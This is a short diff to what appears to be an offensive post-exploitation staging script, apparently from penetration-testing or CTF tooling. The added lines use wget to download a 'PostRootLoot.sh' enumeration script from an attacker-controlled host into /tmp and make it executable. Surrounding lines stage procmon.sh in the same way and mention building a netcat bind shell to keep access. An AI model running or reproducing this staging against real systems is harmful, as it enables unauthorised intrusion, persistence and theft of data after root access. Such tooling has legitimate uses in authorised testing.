@@ -49,6 +49,10 @@ if [ -z "$1" ]
   echo "[*] Downloading procmon.sh to: /tmp/ + making executable"
   wget $1/Tools/procmon.sh -O /tmp/procmon.sh && chmod +x /tmp/procmon.sh
   
+  # download PostRootLoot.sh
+  echo "[*] Dwonloading PostRootLoot.sh to /tmp/ + mnaking executable"
+  wget $1/Enumeration/PostRootLoot.sh -O /tmp/PostRootLoot.sh && chmod +x /tmp/PostRootLoot.sh
+  
   echo "--------------------------------------Config staging section ---------------------------------"
 
   # build a NC bind shell incase we lose a shell
